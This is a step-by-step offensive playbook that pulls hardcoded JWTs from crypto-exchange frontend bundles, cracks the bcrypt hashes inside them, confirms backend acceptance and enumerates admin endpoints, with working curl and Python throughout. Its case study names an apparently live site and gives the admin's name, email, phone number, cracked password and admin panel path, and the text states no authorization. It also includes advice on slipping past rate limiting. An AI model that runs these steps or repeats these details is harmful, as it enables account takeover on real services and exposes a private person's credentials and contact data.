# JWT Extraction + Bcrypt Cracking + Backend Verification Workflow

**Validated:** versatizecoin/bcswap.org 2026-08-16 — full admin credential leak from frontend JS bundle.

## Pattern

Vite/React/Next.js bundles on DEX/swap/crypto frontends often ship a hardcoded
`ACCESS_TOKEN` JWT that the frontend uses to authenticate with the backend API.
The JWT payload may contain full user credentials including bcrypt password hash.

## Step-by-Step

### 1. Download the JS bundle
```bash
curl -sk -A 'Mozilla/5.0' https://target.com/assets/index-XXXX.js -o /tmp/bundle.js
```
For large DEX bundles (6MB+), expect 50% Web3 SDK (viem, wagmi, walletconnect) +
50% app code. The secret is typically in the app-code half, near constant declarations.

### 2. Extract the JWT
```python
import re
data = open('/tmp/bundle.js').read()
# Pattern: ACCESS_TOKEN="eyJ..." or similar
m = re.search(r'ACCESS_TOKEN\s*=\s*"([^"]+)"', data)
jwt = m.group(1)
print(f"JWT length: {len(jwt)}")
```

### 3. Decode the JWT payload (no key needed)
```python
import json, base64
parts = jwt.split('.')
def pad(s): return s + '=' * (-len(s) % 4)
header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
print(json.dumps(payload, indent=2))
```

Look for in payload:
- `role` field (ADMIN, superadmin, owner)
- `password` or `hash` field (bcrypt `$2b$`/`$2a$` prefix)
- `email`, `userName`, `id`
- Absence of `exp` claim (permanent token)

### 4. Crack the bcrypt hash
```python
import bcrypt
hash = payload['userData']['password'].encode()
# Start with contextual wordlist:
words = [
    'Prakash@123', 'Admin@123', 'admin123', 'password',
    # also try: userName, email local-part, company name, year variants
    payload['userData']['userName'],
    payload['userData']['name'],
    payload['userData']['email'].split('@')[0],
]
for pw in words:
    if bcrypt.checkpw(pw.encode(), hash):
        print(f"CRACKED: {pw}")
        break
```

**Contextual wordlist beats rockyou** — the password is often a weak pattern
(name + @ + digits) set by the developer/admin themselves.

### 5. Verify against backend
```bash
# Without JWT → should return auth error
curl -sk "https://api.target.com/admin/endpoint?page=1"
# => {"message":"Invalid token or expired!"}

# With JWT → should return different response (permission error or success)
curl -sk -H "Authorization: Bearer $JWT" "https://api.target.com/admin/endpoint?page=1"
# => {"message":"You are not authorized"}
# OR => {"success":true,"data":[...]}
```

**Key signal:** Different error messages WITH vs WITHOUT token prove the JWT is
actively validated by the backend. A "not authorized" response is still a finding
— it means the token is recognized, just missing specific permissions.

### 6. Map the admin surface
Once the JWT is confirmed valid, enumerate backend endpoints:
```bash
for p in /banner/admin/list /newsletter/list /subscription/broadcast /auth/login; do
  echo -n "$p: "
  curl -sk -H "Authorization: Bearer $JWT" "https://api.target.com$p" | head -c 300
done
```

## Red Flags in JWT payload

| Signal | Meaning |
|--------|---------|
| No `exp` claim | Token never expires — permanent access |
| `password` in payload | Server puts bcrypt hash in JWT (terrible practice) |
| `role: "ADMIN"` | Full admin privileges |
| `id: 1` | First/root user |
| `alg: "HS256"` | Symmetric — same key signs + verifies. If key leaks, forge arbitrary tokens |

## versatizecoin/bcswap Case Study

- **Bundle:** bcswap.org/assets/index-C8vV5JXw.js (6,973,886 bytes)
- **JWT:** `ACCESS_TOKEN="eyJhbG...aO2w"` (481 chars, 3 parts, HS256)
- **Payload contained:** userData with id=1, userName="BC751376", name="Prakash",
  email="prakash@gmail.com", mobile="6200134790", role="ADMIN",
  password=<REDACTED-PASSWORD-HASH>
- **Cracked:** `Prakash@123`
- **Backend:** swapmonitapi.bchscan.io validated the JWT (different response with/without token)
- **Admin panel:** bcswap.org/admin/* (dashboard, newsletter, banner management)

## Pitfalls

- **Truncated tokens in minified builds:** Some bundlers truncate display strings
  with `...` (e.g. `eyJhbG...aO2w`). If the token has literal `...`, the build tool
  replaced the middle. Check if the full token exists elsewhere in the bundle or
  if the build was configured to mask secrets.
- **JWT used as axios default:** Look for `axios.create({headers:{Authorization:ACCESS_TOKEN}})`
  — the token is sent on EVERY request to that baseURL.
- **Rate limiting:** Backend may rate-limit after multiple auth attempts. Space
  out login probes by 10+ seconds.
- **False negative on "Not Found":** If the backend returns "Not Found" for POST
  login even with correct credentials, the route may be implemented but returning
  a generic error. Check the JS bundle for the actual endpoint path and HTTP method.